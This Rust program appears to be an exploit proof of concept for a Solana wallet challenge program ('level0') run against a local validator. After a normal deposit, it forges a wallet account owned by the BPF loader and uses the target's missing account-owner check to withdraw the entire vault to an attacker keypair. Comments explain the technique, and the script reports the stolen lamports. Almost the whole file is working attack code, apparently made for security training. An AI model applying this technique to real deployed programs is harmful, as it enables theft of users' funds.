#![allow(warnings)] 
// Avoid warning on hacker_wallet.serialize(&mut wall_data);
use solana_client::rpc_client::RpcClient;

use solana_program::{
        pubkey::Pubkey,
        instruction::{AccountMeta, Instruction},
        bpf_loader,
    };
use solana_sdk::{
        system_program,
        signature::{Keypair, read_keypair_file}, 
        signer::Signer, 
        commitment_config::CommitmentConfig,
        transaction::Transaction,
        native_token::LAMPORTS_PER_SOL,
    };

use borsh::{BorshSerialize, BorshDeserialize};

use owo_colors::OwoColorize;

#[derive(Debug, BorshDeserialize, BorshSerialize)]

pub enum WalletInstruction {
    Initialize,
    Deposit { amount: u64 },
    Withdraw { amount: u64 },
}

#[repr(C)]
#[derive(Clone, Copy, Debug, Default, PartialEq, BorshSerialize, BorshDeserialize)]
pub struct Wallet {
    pub authority: Pubkey,
    pub vault: Pubkey,
}

pub const WALLET_LEN: u64 = 32 + 32;

fn main() {

    let programa_keypair = read_keypair_file("./target/so/level0-keypair.json").unwrap();
    let programa = programa_keypair.pubkey();

    let cliente1 = String::from("http://localhost:8899");

    //let payer = Keypair::new();
    let authority = Keypair::new();

    let env = RpcClient::new_with_commitment(cliente1, CommitmentConfig::confirmed());

    match env.request_airdrop(&authority.pubkey(), LAMPORTS_PER_SOL) {
        Ok(sig) => loop {
            if let Ok(confirmed) = env.confirm_transaction(&sig) {
                if confirmed {
                    println!("Transaction: {} Status: {}", sig, confirmed);
                    break;
                }
            }
        },
        Err(_) => println!("Error requesting airdrop"),
    };

    let (wallet_address, _) =
    Pubkey::find_program_address(&[&authority.pubkey().to_bytes()], &programa);
    let (vault_address, _) = Pubkey::find_program_address(
    &[&authority.pubkey().to_bytes(), &"VAULT".as_bytes()], &programa);

    println!("");
    println!("{}", "Initializing...".purple().bold());
    println!("");
    let tx_init = Instruction {
        program_id: programa,
        accounts: vec![
            AccountMeta::new(wallet_address, false),
            AccountMeta::new(vault_address, false),
            AccountMeta::new(authority.pubkey(), true),
            AccountMeta::new_readonly(solana_program::sysvar::rent::id(), false),
            AccountMeta::new_readonly(system_program::id(), false),
        ],
        data: WalletInstruction::Initialize.try_to_vec().unwrap(),
    };
    let recent_blockhash = env.get_latest_blockhash().unwrap();

    let tx_init = Transaction::new_signed_with_payer(
        &[tx_init],
        Some(&authority.pubkey()),
        &[&authority],
        recent_blockhash,
    );
        
    env.send_and_confirm_transaction(&tx_init).unwrap();

    let t_amount = 100000u64;

    let tx_deposit = Instruction {
        program_id: programa,
        accounts: vec![
            AccountMeta::new(wallet_address, false),
            AccountMeta::new(vault_address, false),
            AccountMeta::new(authority.pubkey(), true),
            AccountMeta::new_readonly(system_program::id(), false),
        ],
        data: WalletInstruction::Deposit {amount: t_amount}.try_to_vec().unwrap(),
    };
    let recent_blockhash = env.get_latest_blockhash().unwrap();

    let tx_deposit = Transaction::new_signed_with_payer(
        &[tx_deposit],
        Some(&authority.pubkey()),
        &[&authority],
        recent_blockhash,
    );
        
    env.send_and_confirm_transaction(&tx_deposit).unwrap();
    println!("{}","Paying.....".purple().bold());
    
    /*
    CREATE and serialize account with data to steal lamports
    */
    println!("");
    println!("{}", "Stealing lamports....".purple().bold());
    let hacker = Keypair::new();
    
    match env.request_airdrop(&hacker.pubkey(), LAMPORTS_PER_SOL) {
        Ok(sig) => loop {
            if let Ok(confirmed) = env.confirm_transaction(&sig) {
                if confirmed {
                    println!("Transaction: {} Status: {}", sig, confirmed);
                    break;
                }
            }
        },
        Err(_) => println!("Error requesting airdrop"),
    };

    /*
    Because the program doesn't check the owner, we can create an account with data, using the bpf loader as owner
    Then write the serialized data from Wallet Struct, using the authority addr (hacker), 
    , and vault (original Vault PDA)
    */
    let hacker_wallet = Wallet {
        authority: hacker.pubkey(),
        vault: vault_address,
    };

    let mut wall_data: Vec<u8> = vec![];
    hacker_wallet.serialize(&mut wall_data);

    // setting space exemption

    let m_space :u64 = WALLET_LEN;
    let space :usize = m_space as usize;

    //let space = 128;
    let rent_exemption_amount = env.get_minimum_balance_for_rent_exemption(space).unwrap();

    // Creating malicious wallet

    let malicious_wallet = Keypair::new();


    let instructions  = vec! [
        solana_program::system_instruction::create_account(
            &hacker.pubkey(), // from
            &malicious_wallet.pubkey(), // to
            rent_exemption_amount, // lamports
            wall_data.len() as u64, // space
            &bpf_loader::ID, //owner
    ),
        solana_program::loader_instruction::write(
            &malicious_wallet.pubkey(), // account 
            &bpf_loader::ID, // program
            0, // offset 
            wall_data, // bytes
    ),
    ];

    let recent_blockhash = env.get_latest_blockhash().unwrap();

    let tx = Transaction::new_signed_with_payer(
        &instructions,
        Some(&hacker.pubkey()),
        &[&hacker, &malicious_wallet],
        recent_blockhash,
    );
    env.send_and_confirm_transaction(&tx).unwrap();

    let vault_before = env.get_account(&vault_address).unwrap().lamports;
    let hacker_before = env.get_account(&hacker.pubkey()).unwrap().lamports;

    /*
     We exploit the smart contract with the ser(brosh), using expected params. Because the SC doesn't check
     the owner, we hace created an account with same struct but differente owner (bpf loader)
     sending the funds from the Vault PDA to ourself
      */

    let tx_steal = Instruction {
        program_id: programa,
        accounts: vec![
            AccountMeta::new(malicious_wallet.pubkey(), false),
            AccountMeta::new(vault_address, false),
            AccountMeta::new(hacker.pubkey(), true),
            AccountMeta::new(hacker.pubkey(), false),
            AccountMeta::new_readonly(system_program::id(), false),
        ],
        data: WalletInstruction::Withdraw { amount: vault_before }.try_to_vec().unwrap(),
    };
    let recent_blockhash = env.get_latest_blockhash().unwrap();

    let tx_steal = Transaction::new_signed_with_payer(
        &[tx_steal],
        Some(&hacker.pubkey()),
        &[&hacker],
        recent_blockhash,
    );
        
    env.send_and_confirm_transaction(&tx_steal).unwrap();

    println!("");
    if hacker_before < (env.get_account(&hacker.pubkey()).unwrap().lamports) {
        println!("{} {} {}" ,"***HAXXX****".green().bold(),
        "Stolen lamports: ".purple(), env.get_account(&hacker.pubkey()).unwrap().lamports - hacker_before)
    } else { print!("Something went wrong..... :(") }
    println!("");
    let v_info = env.get_account(&vault_address);
    match v_info {
        Ok(_) => println!("Vault info: {:?}", v_info.unwrap()),
        Err(error) => println!("The Account: {}, does't exist anymore: {:?}",vault_address.blue(), error.red().bold()),
    };
    println!("");
}